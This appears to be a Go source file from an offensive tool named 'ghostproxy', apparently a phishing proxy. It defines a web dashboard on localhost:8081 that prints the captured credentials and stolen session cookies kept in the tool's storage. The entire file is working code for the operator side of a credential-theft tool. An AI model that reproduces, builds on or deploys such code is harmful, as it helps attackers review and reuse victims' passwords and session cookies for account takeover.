package dashboard

import (
	"fmt"
	"net/http"
	"ghostproxy/storage"
)

func StartDashboard() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintln(w, "<h2>Captured Credentials</h2><pre>")
		for _, c := range storage.Credentials {
			fmt.Fprintln(w, c)
		}
		fmt.Fprintln(w, "</pre><h2>Cookies</h2><pre>")
		for _, c := range storage.Cookies {
			fmt.Fprintln(w, c)
		}
		fmt.Fprintln(w, "</pre>")
	})
	fmt.Println("[+] Dashboard available on http://localhost:8081")
	http.ListenAndServe(":8081", nil)
}
